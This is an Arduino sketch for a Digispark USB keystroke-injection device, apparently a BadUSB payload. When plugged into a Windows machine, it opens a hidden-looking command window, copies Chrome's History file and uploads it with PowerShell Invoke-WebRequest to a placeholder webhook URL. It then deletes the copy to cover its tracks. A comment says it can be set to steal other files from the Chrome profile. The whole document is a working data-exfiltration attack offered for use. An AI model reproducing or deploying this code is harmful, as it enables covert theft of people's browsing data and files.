//by SKocur

#include "DigiKeyboard.h"

#define TARGET_FILE "History" //If you want to steal other file (from C:\Users\..\AppData\Local\Google\Chrome\User Data\Default) set its name here
#define WEBHOOK_URL "https://URL" //URL to online webhook listener

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd %temp%\\..\\Google\\Chrome\\User Data\\Default");
  DigiKeyboard.println("powershell Copy-Item History -Destination " TARGET_FILE ".backup"); //cannot copy original file while chrome process is running, so it must be copied
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri " WEBHOOK_URL " -Method POST -InFile " TARGET_FILE ".backup");
  DigiKeyboard.println("del " TARGET_FILE ".backup /f /q");
  DigiKeyboard.println("exit");
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
